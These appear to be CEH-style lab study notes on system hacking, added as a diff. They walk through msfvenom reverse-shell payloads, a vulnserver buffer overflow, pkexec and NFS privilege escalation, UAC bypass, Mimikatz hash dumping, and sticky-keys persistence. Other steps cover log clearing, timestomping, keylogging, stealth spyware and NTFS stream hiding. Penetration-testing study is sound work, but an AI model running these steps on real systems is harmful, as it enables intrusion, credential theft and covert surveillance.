@@ -1,0 +1,1219 @@
+SYSTEM HACKING
+
+$ dpkg-query -l   (find out all packages installed in a Linux Machine)
+$ dpkg-query -l package_name   (Find out if a particular package is installed in a Linux Machine)
+
+There are four steps in the system hacking:
+
+	- Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
+
+	- Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
+
+	- Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files
+
+	- Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.
+
+
+
+
+1. Gain access to the system
+
+a. Perform active online attack to crack the system’s password using Responder
+
+https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/
+
+Responder is an LLMNR, NBT-NS, and MDNS poisoner.
+On Host Machine;
+$ cd Responder
+$ chmod +x ./Responder.py
+$ sudo ./Responder.py -I ens3 (or enth0, or whatever your interface name is - ifconfig) - Responder starts listening on the nwk interface
+
+On Victim Machine;
+- Open Run
+- Type \\CEH-Tools       (or any network share)
+- Open
+
+On Host Machine;
+Responder starts capturing the access logs of the Windows victim Machine. Collects the NTLM hashes of the user.
+Responder stores the logs in Home/responder/logs. 
+
+To crack the hashes;
+$ sudo snap install john-the-ripper    (assuming its not already installed)
+$ sudo john /home/ubuntu/Responder/Logs/[NTLM Log File Name.txt] 
+In Kali;
+$ sudo john /usr/share/responder/logs/[NTLM Log File.txt]
+
+Quiz
+$ john --format=NT passwdfile.txt
+
+PersonalReading
+$ john --wordlist=/usr/share/wordlists/crypton.txt hashes.txt
+$ john --format=LM --wordlist=/root/usr/share/john/password_john.txt hash.txt
+
+
+
+
+
+b. Audit system passwords using L0phtCrack
+
+L0phtCrack is a tool designed to audit passwords and check their strength.
+PS: You need the Administrator Password to do this.
+
+Open l0phtcrack 7 (LC7) -> Password Auditing Wizard -> Next -> Choose Target System Type (Windows) Next -> Windows Import (A remote machine) Next -> Host (x.x.x.x), Use Specific User Credentials (Username: Administrator, Password: Pa$$w0rd, Domain: CEH.com - if system is under a domain), Next -> Choose Audit Type (Thorough Password Audit), Next -> Reporting Options (Generate Report at End of Auditing: CSV, Browse: Desktop), Next -> Job Scheduling (Run this job immediately), Next -> Summary, Finish
+
+
+
+
+c. Find vulnerabilities on exploit sites
+
+https://www.exploit-db.com/
+SEARCH EDB (left pane) -> Type (remote), Platform (Windows_x86-64) -> Search
+Click on any exploit -> Download -> Right-click download ->Open with Notepad++
+
+
+
+d. Exploit client-side vulnerabilities and establish a VNC session
+
+Step 1: On Host Machine (Parot) - Create Malicious File
+$ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attacker/Desktop/Test.exe  (generate malicious file 'Test.exe' in location /home/attacker/Desktop
+
+Step 2: Create a directory to share the file
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ cp /home/attacker/Desktop/Test.exe /var/www/html/share
+$ service apache2 start 
+
+Step 3: Start the Listener
+$ msfconsole
+$ use exploit/multi/handler
+$ set payload windows/meterpreter/reverse_tcp
+$ set LHOST 10.10.1.13
+$ set LPORT 444
+$ exploit 
+
+Step 4:On Windows Machine
+Browser -> http://10.10.1.13/share -> Install Test.exe
+
+Step 5: On Host (Parot)
+#  $ sessions -i 1  (if the Meterpreter shell is not automatically connected to the session)
+$ sysinfo   (view victim system information)
+$ upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1    (Uploads the PowerSploit file - a program used to quickly check against a Windows machine for privilege escalation opportunities). 
+$ shell  (open a shell, first lands at Downloads folder)
+$ powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks" (Displays Checks with AbuseFunctions)
+
+Step 6: Esploit VNC Vulnerability to gain remote access to victim machine
+$ exit  (revert to Meterpreter)
+$ run vnc (Opens VNC session)
+
+
+
+e. Gain access to a remote system using Armitage
+
+Automated and Visualized Metasploit.
+
+Step 1: Host Machine (Parot) start armitage
+$ sudo su
+$ cd    (jump to root)
+$ service postgresql start   (start the database)
+Applications -> Pentesting -> Exploitation Tools -> Metasploit Framework -> armitage          (launch armitage)
+Security PopUp (pwd) -> Ok -> Connect PoUp (Host: 127.0.0.1, Port: 55553, User: msf, Pass: [pwd]), Connect -> Start Metasploit PopUp (Yes)
+
+Step 2: Discover Target (Parot)
+Hosts -> Nmap Scan -> Intense Scan -> Input PopUp (target IP) -> Ok -> Message PopUp (Ok)
+
+Step 3: Create Payload
+Payload -> Windows -> Meterpreter -> meterpreter_reverse_tcp (double-click)
+LPORT: 444
+Output: exe
+Launch -> save (Desktop), File Name (malicious_payload.exe) -> Message PopUp (Ok) 
+
+Step 4: Share/Send Payload
+Create a shared directory with the right permissions. Cp payload to the share.
+$ service apache2 start 
+
+Step 5: Start Meterpreter Listener
+Amitage -> meterpreter_reverse_tcp (double-click) -> LPORT: 444, Output: multi/handler -> Launch
+
+Step 6: Download and run the Payload (Target Machine)
+
+Step 7: Interact with Target
+Right-click target -> Metapreter 1 -> Interact -> Meterpreter Shell (In the Shell type 'sysinfo')
+Right-click target -> Meterpreter 1 -> Explore -> Browse Files
+Right-click target -> Meterpreter 1 -> Explore -> Screenshot 
+
+
+
+
+f. Gain access to a remote system using Ninja Jonin
+
+Ninja => Victim's Machine
+Jonin => Host Machine
+
+PS: The main functionality of the tool is to control a remote machine behind any NAT, Firewall and proxy.
+
+Step 1: Extract the Files
+Copy and paste the 2 files in desktop
+Right-click Jonin -> WINRAR -> Extract Here
+Create Folder (Trial-version) -> Right-Click Ninja -> WinRAR -> Extract files -> Trial-Version -> Ok
+
+Step 2: Edit Ninja Configuration
+../Desktop/Trial-Version/config -> Right-click constants.json -> Open with -> More apps -> Notepad -> Ok
+Change Name (to Server22 - Victim machine name), Host (to 10.10.1.11 - Host IP) -> Save -> Close
+
+Step 3: send Ninja to Victim Machine
+Right-click Trial-Version -> WinRAR -> Add to archive -> Archive Format (Zip) -> Ok
+Copy Trial-Version.zip -> Paste it in Share (Spyware)
+
+Step 4: Start Listener
+Double-click Jonin-v1.1.0-win.exe -> Press any key when a command prompt appears.
+
+Step 5: Infect Victim Machine
+Login to Windows server 2022 -> Copy and paste Trial-version to Desktop and Extract Here -> Double-click Ninja-v1.2.1-win.exe -> Press any key when a command prompt appears (connection is established).
+
+Step 6: Interact with Victim from Host
+In command prompt type -> list    (lists all connected devices)
+In command prompt type -> connect 1  (connect to Server22)
+In command prompt type -> change -> Enter Type: cmd    (to get cmd session)
+Type -> ipconfig
+Type -> whoami
+Type -> #help  (view all possible commands)
+
+
+
+
+
+g. Perform buffer overflow attack to gain access to a remote system
+
+Attach a Vulnerable Server to Immunity Deburger
+https://www.youtube.com/watch?v=PJoAT9uT_a0
+https://www.youtube.com/watch?v=i-DUOtM8XS8
+
+Host Machine -> Parot. Victim machine -> Windows 11
+
+Step 1: Victim Machine: Install Vuln Server and Immunity Debugger
+
+..\Buffer Overflow Tools\vulnserver  right-click and Run vulnserver.exe as administrator
+..\Buffer Overflow Tools\Immunity Debugger  right-click to Run ImmunityDebugger_1_85_setup.exe as administrator. After Install: Close, Ok (to install python)
+Desktop -> Right-click Immunity Debugger -> Run as administrator -> File -> Attach -> Select process to attach (vulnserver) -> Attach (vulnserver appears: Paused) -> Run Program (run Immunity Debugger)
+
+Step 2: Attacker Machine: Establish Connection with Vuln Server with Netcat
+
+$ cd -> jump to root.
+$ nc -nv 10.10.1.11 9999         (9999 = target port)
+type HELP   -> lists Valid Commands/Functions in Vuln server
+type EXIT   -> exit program 
+
+Step 3: Create Spike Templates: To identify functions vulnerable to Buffer Overflow
+
+$ pluma stats.spk       (Create a spike template for spiking on the STATS function)
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+
+Save -> Close
+
+$ generic_send_tcp 10.10.1.11 9999 stats.spk 0 0      (send package to vuln server. stats.spk = spike_script. 0 and 0 are values of SKIPVAR and SKIPSTR).
+
+Move to Immunity Debugger -> process status:Running -> means STATS function is not vulneable to buffer overflow
+Move back to host
+
+Ctrl+C to terminate stats_script
+
+Relaunch Vuln Server and deburger
+
+Back to Host
+
+$ pluma trun.spk      (create a spike template for spiking on the TRUN function)
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+
+Save -> Close
+
+$ generic_send_tcp 10.10.1.11 9999 trun.spk 0 0 
+
+Move to Immunity debugger -> process status: Paused -> means TRUN function on vuln server is vulnerable to buffer overflow vuln
+
+PS: Spiking the TRUN function has overwritten stack registers such as EAX, ESP, EBP, and EIP. Overwriting the EIP register can allow us to gain shell access to the target system
+
+PS: You can observe in the top-right window that the EAX, ESP, EBP, and EIP registers are overwritten with ASCII value “A”, as shown in the screenshot.
+
+Move to Host and terminate the script. Move to victim and Relaunch Immunity Debugger
+
+Step 4: Perform Fuzzing to find Length of Data that Can Crash the Program/Overwrite the Memory
+
+Places -> Network -> Ctrl+L (Location fileappears) -> type smb://10.10.1.11    (access Windows 11 shared folders) -> (Usrname: Admin, Pwd: Pa$$w0rd, Connect) -> CEH-Tools -> ..\Buffer Overflow Tools -> copy Scripts folder -> Paste Scripts folder on Desktop 
+
+$ cd /home/attacker/Desktop/Scripts     (Navigate to Scripts folder)
+$ chmod +x fuzz.py
+$ ./fuzz.py         (run python fuzzy script)
+Move to Immun Debug - It is Paused but EIP register is not overwritten
+Move to host and end script -> A message saying Vuln Server crashed at approx 11800 bytes
+Relaunch Immunity Debugger and Vuln Server
+Use pattern_create Ruby tool to generate random bytes of data.
+New Terminal
+$ /usr/share/metersploit-framework/tools/exploit/pattern_create.rb -l 11900       (nearest even-number after 11800 generated previously)
+Copy the bytes generated.
+
+switch back to the Script terminal
+$ pluma findoff.py
+replace the code within inverted commas ("") in the offset variable with the copied bytes
+Save -> Close
+
+$ chmod +x findoff.py 
+$ ./findoff.py      (send the generated random bytes to the vuln server)
+Immunity Debugger is Paused. EIP is overwritten with random bytes.  (note down the random byte)
+
+Step 5: Find the Offset 
+$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337     (-q = offset value: identified in overwritten EIP)
+A result indicates that Identified EIP register is at an offset of 2003 bytes
+
+Relaunch Immunity Debugger and Vuln Server
+
+Step 6: Overwrite the EIP Register, to Confirm it can be Controlled with Malicious shellcode
+
+On the Script terminal
+
+$ chmod +x overwrite.py
+$ ./overwrite.py    (check if we can controlthe EIP register)
+Switch to Immunity debugger (EIP is overwritten - meaning we can control EIP register with malicious shellcode)
+
+Relaunch Immunity Debugger and Vuln Server
+
+Step 7: Identify Bad Characters that may cause issues in the Shellcode
+
+Egs: no byte, i.e  "\x00"
+$ chmod +x badchars.py
+$ ./badchars.py       (send the badchars along the shellcode)
+In Immunity Debugger  Click ESP Register -> Right-click ESP Register -> Follow in Dump (Observe there are no badchars that cause problemin the shellcode)
+
+Relaunch Immunity Debugger and Vuln Server
+
+Step 8: Identify the Right Module of the Vulnerable Server that is lacking Memory Protection
+
+In Victim Machine
+E:\CEH-Tools\..\Buffer Overflow Tools\Scripts      copy mona.py
+C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands        paste mona.py
+
+At bottom of Immunity Debugger
+!mona modules      (Log data pop-upwindow appears, showing no memory protection for the essfunc.dll module).
+
+Step 9: Exploit the essfunc.dll module to inject shellcode and take full control of the EIP register
+
+Open new terminal in host
+$ cd
+$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb   (the nasm command line appears)
+type JMP ESP     (The result appears, displaying the hex code of JMP ESP = FFE4)
+type EXIT to stop the script.
+
+In the Immunity Debugger
+!mona find -s "\xff\xe4" -m essfunc.dll   (result shows address of the vulnerable module is **0x625011af**)
+
+Relaunch Immunity Debugger and Vuln Server
+Click "Go to address in Disassembler icon" -> Enter expression to follow (625011af = identified return address)
+You will be pointed to 625011af ESP; press F2 to set up a breakpoint at the selected address
+Click on Run Program to run Immunity Debugger
+
+At the host
+$ chmod +x jump.py
+$ ./jump.py
+In the Immunity Debugger window, you will observe that the EIP register has been overwritten with the return address of the vulnerable module
+
+Close Immunity Debugger and the vuln server.
+
+Step 10: Create Payload and Launch to the Vuln Server
+
+Relaunch Vuln server as Administrator
+
+On Host, open new terminal
+$ cd 
+$ msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.1.11 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"  (generate shellcode)
+Select the code, Right-click and Copy. 
+Close the terminal -> open the Script terminal
+$ pluma shellcode.py
+Paste the copied shellcode in the overflow otion (Line 4). Save and Close.
+Open new terminal -> $ cd
+$ nc -nvlp 4444  (netcat command tolisten on port 4444)
+Switch to Script terminal
+$ chmod +x shellcode.py
+$ ./shellcode.py
+Switch back to the terminal running the netcat command
+A shell access to the Vuln Server is is established.
+
+$ whoami
+
+
+
+
+
+
+
+2. Perform privilege escalation to gain higher privileges
+
+a. Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
+
+Find misconfigurations in the target system using BeRoot and Seatbelt and further escalate privileges by exploiting client-side vulnerabilities
+
+https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
+
+Note: Windows privileges can be used to escalated privileges. 
+
+These privileges include; SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.
+
+Step 1: Create Exploit, Create a Share Folder with right Permissions and Share the Exploit in the Share Folder and start the Apache2 Server
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
+$ service apache2 start 
+
+Step 2: Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST 10.10.1.13
+> exploit -j -z
+
+Step 3: Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run Exploit.exe (this opens a Meterpreter session with the Host/Attacker)
+
+Step 4: Launch a Meterpreter Shell
+
+> sessions -i 1        (1 = the id number of the session)
+> getuid    (Display current user ID. Shows that Meterpreter is running with normal user privileges [WINDOWS11\Admin])
+
+Step 5: Use BeRoot to Assess Configuration to find Vulnerabilities to exploit for PrivEsc
+
+Places -> Network -> Ctrl+L -> smb://10.10.1.11 -> Username: Admin, Pwd: Pa$$w0rd -> Connect -> CEH-Tools -> CEHv12 Module 06 ..\Privilege escalation Tools -> Copy BeRoot Folder -> Paste BeRoot Folder on Desktop - Switch to Terminal with active Meterpreter session
+> upload /home/attacker/Desktop/BeRoot/beRoot.exe   (uploads beroot.exe to victim's download directory)
+> shell     (open shell session - shell lands in Download directory)
+$ beRoot.exe   (result appears, displaying information about service names along with their permissions, keys, writable directories, locations, and other vital data)
+
+After viewing the available privileges and seing if you have one of the windows privilege tokens;
+$ exit    (navigate back to Meterpreter session)
+
+Step 6: Use GhostPack Seatbelt tool to gather host information and perform security checks to find insecurities in the target system
+
+Repeat step 5 till ..\Github Tools   copy Seatbelt.exe and paste on desktop. Move back to open Meterpreter Session
+> upload /home/attacker/Desktop/Seatbelt.exe    (Upload Seatbelt.exe to target)
+> shell
+$ Seatbelt.exe -group=system   (Gather info about AMSIProviders, Antivirus, AppLocker, ARPTable etc)
+$ Seatbelt.exe -group=user    (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.)
+$ Seatbelt.exe -group=misc   (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc). 
+
+PS: Other Seatbelt Commands: Seatbelt.exe -group=all, Seatbelt.exe -group=slack, Seatbelt.exe -group=chromium, Seatbelt.exe -group=remote
+In the shell session;
+$ exit   (get back to Meterpreter session)
+
+Step 7: bypass the user account control setting (security configuration) using an exploit, and then escalate the privileges using the Named Pipe Impersonation technique.
+
+Note: You will not be able to execute commands (such as hashdump, which dumps the user account hashes located in the SAM file, or clearev, which clears the event logs remotely) that require administrative or root privileges.
+
+> run post/windows/gather/smart_hashdump   (Command returns error stating "Insufficient privileges to dump hashes!". The meterpreter session require admin privilege).
+PS: we shall try to escalate the privileges by issuing a "getsystem" command that attempts to elevate the user privileges
+> getsystem -t 1  (This command uses the service - Named Pipe Impersonation [In Memory/Admin] technique. The command fails to escalate privilege - returns error "Operation failed"). This is because the security config of Windows 11 (user account control setting) is blocking us from gaining unrestricted access to it.
+To try and bypass UAC, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
+
+> background (move the current Meterpreter session to the background)
+> use exploit/windows/local/bypassuac_fodhelper     (use bypassuac_fodhelper exploit)
+> show options    (displays requirements for the exploit. The SESSION option is required but the Current Setting is emtpy).
+> set SESSION 1   (1 = the current Meterpreter session number running in background)
+> set payload windows/meterpreter/reverse_tcp (set the meterpreter/reverse_tcp payload)
+> show options  (show options required to configure the payload)
+LHOST is required, current setting is empty (Host IP)
+EXITFUNC is required, current setting is set to process = so ignore
+LPORT is require, current setting is set to 4444 = so ignore
+> set LHOST 10.10.1.13
+> set TARGET 0    (0 = Exploit Target ID)
+> exploit      (Begins to exploit UAC settings on target machine)
+> getuid      (Meterpreter is stillrunning with normal user privilege)
+> getsystem -t 1     (elevate privilege and get SYSTEM privilege. This time, no blocking by UAC)
+> getuid      (Now running with system privileges  - NT AUTHORITY\SYSTEM)
+> run post/windows/gather/smart_hashdump (Meterpreter can now successfully extract the NTLM hashes and display them).
+> clearev  (remotely clear event logs. This requires Administrator or root privileges).
+
+
+
+
+
+
+b. Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
+
+Step 1: Steps 1 to 4 of Lab 2a. 
+Exploit = Backdoor.exe
+Create a file on Target Machine, write something and Save in Downloads Folder (Secret.txt).
+
+Step 2: Post-Exploitation Commands/Activities
+
+> sysinfo
+> ipconfig
+> getuid
+> pwd    (will differ according to where you saved Backdoor.exe)
+>  ls  (list files in current directory)
+> cat Secret.txt  (read contents of Secret.txt)
+To Change the MACE (modified, Accessed, Created, Entry Modified) attributes of Secret.txt
+> timestomp Secret.txt -v     (view the current MACE attributes of Secret.txt)
+> timestomp Secret.txt -m "02/11/2018 08:10:03"    (change the Modified value of Secret.txt)
+> timestomp Secret.txt -a "date time"   (change accessed)
+> timestomp Secret.txt -c "date time"  (change created)
+> cd C:/   (Move to C directory)
+> search -f pagefile.sys    (display the location of pagefile.sys)
+> keyscan_start    (start capturing all keyboard input)
+> keyscan_dump     (dump all captured keystrokes) 
+> idletime (display amount of time user has been idle)
+> shell   (open a shell inmeterpreter)
+$ dir /a:h   (retrieve directory names with hiden attributes)
+$ sc queryex type=service state=all   (list all available service)
+$ netsh firewall show state      (display current firewall state)
+$ netsh firewall show config    (view current firewall settings)
+$ wmic /node:"" product get name,version,vendor    (view details of installed software)
+$ wmic cpu get      (retrieve details of processor)
+$ wmic useraccount get name,sid    (retrieve login names and SIDs of the users)
+$ net start or stop    (start/stop a network service)
+$ netsh advfirewall set currentprofile state off    (Turn off firewall service for current profile)
+$ netsh advfirewall set allprofiles state off    (Turn off firewall service for all profiles)
+$ wmic os where Primary='TRUE' reboot     (reboot the target system) 
+
+
+
+
+
+c. Escalate privileges by exploiting vulnerability in pkexec
+
+Polkit or Policykit is an authorization API used by programs to elevate permissions and run processes as an elevated user.The successful exploitation of the Polkit pkexec vulnerability allows any unprivileged user to gain root privileges on the vulnerable host.
+
+We are exploiting the pkexec CVE-2021-4034 vulnerability from CVE database.
+
+$ whoami   (attacker)
+$ mkdir /tmp/pwnkit     (create directory in tmp directory)
+$ mv CVE-2021-4034 /tmp/pwnkit/    (move the exploit to the new directory)
+$ cd /tmp/pwnkit
+$ cd CVE-2021-4034
+$ make
+$ ./cve-2021-4034
+$ whoami      (root)
+
+
+
+
+
+d. Escalate privileges in Linux machine by exploiting misconfigured NFS
+
+https://www.digitalocean.com/community/tutorials/how-to-set-up-an-nfs-mount-on-ubuntu-16-04
+https://www.redhat.com/sysadmin/suid-sgid-sticky-bit
+https://www.youtube.com/watch?v=sp4YO94x9-E
+
+Step 1: Target Marchine: Install nfs, Configure Exports file (with directory to share to who?),and Restart the nfs server.
+
+$ sudo apt-get update
+$ sudo apt install nfs-kernel-server
+$ sudo nano /etc/exports   (/etc/exports file holds a record for each directory that user wants to share within a network machine).
+
+/home *(rw,no_root_squash)           (/home = share the home directory, * = connection from any host [this can equally be a specified IP], rw = grants read/write operation, no_root_quash = root user on a client can access the share as a root user [and not automatically directed to nobody:nogroup])
+Ctrl+S    (save)
+Ctrl+X    (exit)
+
+$ sudo /etc/init.d/nfs-kernel-server restart     (restart the NFS server)
+
+Step 2: Host Machine: Confirm NFS is running on target, install NFS operation common files/dependencies
+
+$ nmap -sV 10.10.1.9
+$ sudo apt-get install nfs-common
+
+Step 3: Host Machine: Find network share in target machine, create a directory and mount the share in the created directory.
+
+$ showmount -e 10.10.1.9
+$ mkdir /tmp/nfs
+$ sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+
+Step 4: Host machine: Copy bash file into the directroy where the share is mounted, assign SUID permission to batch file, 
+
+$ cd /tmp/nfs
+$ sudo cp /bin/bash .
+$ sudo chmod +s bash      (assigns SUID or special user permission to bash. Means file executes with permissions of creator,irrespective of permission of user executing)
+$ ls -la bash
+$ sudo df -h     (get amount of free disks)
+
+Step 5: Host machine: Login (ssh) to target using an ordinary user credential (with limited permission), execute the bash file (with attached SUID permission) to get root access/privilege.
+
+$ ssh -l ubuntu 10.10.1.9       (ubuntu is an orinary user with limited permission)
+$ cd /home    (share where you uploaded the bash file with SUID attached)
+$ ls
+$ ./bash -p      (get root access/permisions)
+# id
+# whoami         (should be root)
+# cp /bin/nano .       (bring nano editor so you can edit whatever you want)
+# chmod 4777 nano     (user [4] assigns 777 permission to nano)
+# ls -la nano
+# cd /home
+# ./nano -p /etc/shadow      (open shadow file so you can copy password hash of any user you want)
+# cat /etc/crontab      (view all running cronjobs - these operations require root privileges)
+# ps -ef      (view all running processes with their PIDs)
+# find / -name "*.txt" -ls 2> /dev/null     (find all .txt files in the system)
+# route -n     (view the host/network names - route table)
+# find / -perm -4000 -ls 2> /dev/null    (view SUID executable binaries)
+
+
+
+
+
+e. Escalate privileges by bypassing UAC and exploiting Sticky Keys
+
+Step 1: Create Exploit, Create a Share Folder with right Permissions and Share the Exploit in the Share Folder and start the Apache2 Server
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+$ service apache2 start 
+
+Step 2: Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> run
+
+Step 3: Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run Windows.exe  (this opens a Meterpreter session with the Host/Attacker)
+
+Step 4: Confirm Current privilege
+
+> getuid    (Windows11\Admin)
+
+Step 5: Bypass User Account Control and get Unrestricted Access
+
+> background
+> search bypassuac
+> use exploit/windows/local/bypassuac_fodhelper
+> set session 1
+> show option
+> set LHOST 10.10.1.13
+> set TARGET 0
+> exploit
+> getsystem -t 1
+> getuid     (NT AUTHORITY \SYSTEM - we now have system privilege)
+
+Step 6: Use sticky_key module in Metasploit to get exploit sticky key and get persistent SYSTEM Access on the system
+
+> background
+> use post/windows/manage/sticky_keys
+> session i*       (list the sessions in meterpreter)
+> set session 2
+> exploit
+
+Step 7: Confirm the Persistent Privilege on Target Machine
+
+- Sign-out and sign-in as an ordinary user with no admin priv (Martin:apple)
+- Lock the system
+- press Shift key 5 times   (this will open a command prompt on the lock screen with System privileges instead of sticky keys error window)
+> whoami    (on the command prompt. nt authority\system)
+
+
+
+
+
+f. Escalate privileges to gather hashdump using Mimikatz
+
+Mimikatz is a post exploitation tool that enables users to save and view authentication credentials such as kerberos tickets, dump passwords from memory, PINs, as well as hashes. It enables you to perform functions such as pass-the-hash, pass-the-ticket, and makes post exploitation lateral movement within a network
+
+Step 1: Create Exploit, Create a Share Folder with right Permissions and Share the Exploit in the Share Folder and start the Apache2 Server
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/backdoor.exe /var/www/html/share/
+$ service apache2 start 
+
+Step 2: Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> run
+
+Step 3: Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run backdoor.exe  (this opens a Meterpreter session with the Host/Attacker)
+
+Step 4: Confirm Current privilege
+
+> getuid    (Windows11\Admin)
+
+Step 5: Bypass User Account Control and get Unrestricted Access
+
+> background
+> search bypassuac
+> use exploit/windows/local/bypassuac_fodhelper
+> set session 1
+> show option
+> set LHOST 10.10.1.13
+> set TARGET 0
+> exploit
+> getsystem -t 1
+> getuid     (NT AUTHORITY \SYSTEM - we now have system privilege)
+
+Step 6: Use Mimikatz to perform Post-exploitation Operations (Access password hashes and login details etc)
+
+> load kiwi     (loads Mimikatz)
+> help kiwi     (view all the kiwi commands)
+> lsa_dump_sam   (load NTLM Hash of all users)
+> lsa_dump_secrets  (view the LSA Secrets Login hashes. LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc)
+> password_change -u Admin -n [NTLM hash of Admin] -P [New Password of Admin]   (to change the password of user Admin).
+
+
+
+
+
+3. Maintain remote access and hide malicious activities
+
+a. User system monitoring and surveillance using Power Spy
+
+PS: Power Spy is a computer activity monitoring software that allows you to secretly log all users on a PC while they are unaware. After the software is installed on the PC, you can remotely receive log reports on any device via email or FTP.
+
+- This task only works if the target machine is turned ON
+- You have learned how to escalate privileges in the earlier lab and will use the same technique here to escalate privileges, and then dump the   password hashes
+- On obtaining the hashes, you will use a password-cracking application such as Responder to obtain plain text passwords
+- Once you have the passwords, establish a Remote Desktop Connection as the attacker; install keylogger tools (such as Power Spy) and leave them   in stealth mode
+
+Step 1: Host Machine: RDP to Target Machine, Copy Power Spy from Host and Paste Install on Target
+
+Username: Jason
+Pwd: qwerty  (login to victim through RDP)
+Z:\CEHv12 Module 06 System Hacking\..\Power Spy    setup.exe    (CCopy installer)
+Run As Administrator      (login pwd: test@123)
+
+Step 2: Configure Power Spy Control Panel
+
+- Start Monitoring
+- Stealth Mode
+- Hotkey Reminder (Ok)
+Note: To unhide Power Spy, use the Ctrl+Alt+X keys together on your PC keyboard.
+- Close RDP
+
+Step 3: Login to Server 2019 as Jason and perform someoperation
+
+Step 4: RDP to Target and View Spied Information
+
+- Press the Ctrl+Alt+X keys to bring Power Spy out of Stealth Mode
+Note: If you are unable to bring Power Spy out of Stealth Mode by pressing the Ctrl+Alt+X keys, then follow below steps:
+	- Click the Type here to search icon at the bottom of Desktop and type Keyboard. Select On-Screen Keyboard from the results.
+	- On-Screen Keyboard appears, long click on Ctrl key and after it turns blue, select Alt key and X key.
+- Run As Administrator (Run)
+- Pwd: test@123
+- Stop Monitoring
+- Applications executed
+- Screenshots
+- Websites visited
+- WindowsOpened, Clipboard, Event History
+- Uninstall   (when done)
+
+
+
+
+b. User system monitoring and surveillance using Spytech SpyAgent
+
+Step 1: Same as above
+
+Step 2: Configuration
+
+- Complete + Stealth Configuration
+- Extras: Load on Windows Startup
+- Start Monitoring
+- Stealth Notice: Ok
+PS: Note: To bring SpyAgent out of stealth mode, press the Ctrl+Shift+Alt+M keys.
+
+Note: >If you are unable to bring Power Spy out of Stealth Mode by pressing the Ctrl+Shift+Alt+M keys, then follow below steps:
+
+Click the Type here to search icon at the bottom of Desktop and type Keyboard. Select On-Screen Keyboard from the results.
+On-Screen Keyboard appears, long click on Ctrl key and after it turns blue, select Shift key, Alt key and M key.
+
+Step 3: Login to Target and performan action
+
+Step 4: Back to SpyTech
+
+- keyboard and Mouse
+- View Keystrokes Log
+- Screenshots
+
+Bak to Spytech Agent
+- Website Usage
+- Event timeline
+
+
+
+
+
+c. Hide files using NTFS Streams
+
+https://blog.foldersecurityviewer.com/ntfs-alternate-data-streams-the-good-and-the-bad/
+
+$ mkdir C:\magic   (create a folder in C called magic)
+copy calc.exe   (C:\Windows\System32) -> paste in C:\magic
+$ cd C:\magic
+$ notepad readme.txt      (create a file readme.txt)
+HELLO WORLD!!  -> Save -> Close
+$ dir      (note the size of readme.txt)
+$ type C:\magic\calc.exe > C:\magic\readme.txt:calc.exe    (hide calc.exe inside readme.txt)
+$ dir       (readme.txt is same size)
+$ del calc.exe     (delete calc.exe)
